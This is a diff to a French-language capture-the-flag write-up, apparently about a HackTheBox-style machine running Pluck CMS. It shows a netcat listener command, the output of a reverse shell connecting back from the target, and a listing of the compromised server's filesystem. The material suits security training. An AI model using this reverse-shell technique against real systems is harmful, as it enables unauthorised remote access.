@@ -286,3 +286,45 @@ Il ne faut pas oublier de démarrer netcat sur notre machine:
 ```bash
 nc -lvnp 5555
 ```
+
+La connexion est établie:
+```bash
+listening on [any] 5555 ...
+connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 48630
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Une fois la connexion établie, on tente de naviguer dans le serveur avec le nouveau shell:
+```bash
+$ pwd
+/var/www/html/pluck
+$ cd /
+$ ls
+bin
+boot
+cdrom
+data
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+
